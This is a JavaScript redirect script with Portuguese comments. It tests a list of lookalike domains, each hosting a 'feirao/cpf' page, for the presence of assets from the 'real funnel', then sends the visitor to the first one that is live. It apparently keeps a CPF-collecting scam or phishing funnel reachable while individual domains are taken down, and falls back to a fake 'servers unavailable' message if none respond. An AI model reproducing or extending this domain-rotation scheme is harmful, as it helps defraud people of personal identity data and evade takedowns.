// Sistema de Redirecionamento Inteligente com Fallback
class RedirectManager {
    constructor() {
        this.urls = [
            
            'https://operacionalfacilita.com/feirao/cpf/cpf.html',
            'https://facilitadaoperacional.com/feirao/cpf/cpf.html',
            'https://atendimentoexpress.click/feirao/cpf/cpf.html',
            'https://checafacil.lat/feirao/cpf/cpf.html',
            
            
        ];
        
        this.currentIndex = 0;
        this.timeout = 5000; // 5 segundos
    }

    // Verifica se a página do funil REAL está online (evita páginas de parking)
    async checkUrlStatus(pageUrl) {
        return new Promise((resolve) => {
            const urlObj = new URL(pageUrl);
            const origin = urlObj.origin;

            // Lista de assets que somente existem no funil
            const probeAssets = [
                origin + '/feirao/cpf/js/pixel.js',
                origin + '/feirao/cpf/images/0FFVTSNZpBwI.webp',
                origin + '/feirao/cpf/css/9d70b2wxwyi4.css'
            ].map(u => u + '?t=' + Date.now());

            let pending = probeAssets.length;
            let decided = false;

            const decide = (ok) => {
                if (decided) return;
                decided = true;
                resolve(ok);
            };

            const timeout = setTimeout(() => decide(false), this.timeout);

            // Usa <link>, <img> e <script> para maximizar chance sem CORS
            // 1) Tenta como imagem
            const img = new Image();
            img.onload = () => { clearTimeout(timeout); decide(true); };
            img.onerror = () => { if (--pending === 0) { clearTimeout(timeout); decide(false); } };
            img.src = probeAssets[1];

            // 2) Tenta como script
            const script = document.createElement('script');
            script.async = true;
            script.src = probeAssets[0];
            script.onload = () => { clearTimeout(timeout); decide(true); };
            script.onerror = () => { if (--pending === 0) { clearTimeout(timeout); decide(false); } };
            document.head.appendChild(script);

            // 3) Tenta como CSS (link preload)
            const link = document.createElement('link');
            link.rel = 'stylesheet';
            link.href = probeAssets[2];
            link.onload = () => { clearTimeout(timeout); decide(true); };
            link.onerror = () => { if (--pending === 0) { clearTimeout(timeout); decide(false); } };
            document.head.appendChild(link);
        });
    }

    // Mostra status para o usuário
    showStatus(message) {
        // Cria ou atualiza elemento de status
        let statusElement = document.getElementById('redirect-status');
        if (!statusElement) {
            statusElement = document.createElement('div');
            statusElement.id = 'redirect-status';
            statusElement.style.cssText = `
                position: fixed;
                top: 20px;
                left: 50%;
                transform: translateX(-50%);
                background: #007bff;
                color: white;
                padding: 15px 25px;
                border-radius: 8px;
                z-index: 10000;
                font-family: Arial, sans-serif;
                font-size: 14px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            `;
            document.body.appendChild(statusElement);
        }
        statusElement.textContent = message;
    }

    // Tenta redirecionar para a próxima URL disponível
    async redirectToAvailableSite() {
        const currentSearch = window.location.search;
        
        console.log('🔄 Iniciando verificação de sites disponíveis...');
        this.showStatus('🔍 Verificando servidores disponíveis...');
        
        while (this.currentIndex < this.urls.length) {
            const currentUrl = this.urls[this.currentIndex];
            const urlWithParams = currentUrl + currentSearch;
            
            console.log(`🔍 Testando: ${currentUrl}`);
            this.showStatus(`🔍 Testando servidor ${this.currentIndex + 1} de ${this.urls.length}...`);
            
            try {
                const isOnline = await this.checkUrlStatus(currentUrl);
                
                if (isOnline) {
                    console.log(`✅ Site online: ${currentUrl}`);
                    console.log(`🔗 Redirecionando para: ${urlWithParams}`);
                    this.showStatus('✅ Redirecionando...');
                    setTimeout(() => {
                        window.location.href = urlWithParams;
                    }, 500);
                    return;
                } else {
                    console.log(`❌ Site offline: ${currentUrl}`);
                }
            } catch (error) {
                console.log(`❌ Erro ao verificar: ${currentUrl}`, error);
            }
            
            this.currentIndex++;
        }
        
        // Se chegou aqui, todos os sites estão offline
        console.error('❌ Todos os sites estão offline!');
        this.showStatus('❌ Servidores temporariamente indisponíveis');
        setTimeout(() => {
            alert('Desculpe, nossos servidores estão temporariamente indisponíveis. Tente novamente em alguns minutos.');
        }, 1000);
    }

    // Método público para iniciar o redirecionamento
    async startRedirect() {
        // Salva parâmetros UTM no localStorage como backup
        const currentSearch = window.location.search;
        if (currentSearch) {
            localStorage.setItem('utm_params', currentSearch);
            console.log('💾 Parâmetros UTM salvos:', currentSearch);
        }
        
        await this.redirectToAvailableSite();
    }
}

// Função global para ser chamada pelo botão
async function abrirChat() {
    const redirectManager = new RedirectManager();
    await redirectManager.startRedirect();
}
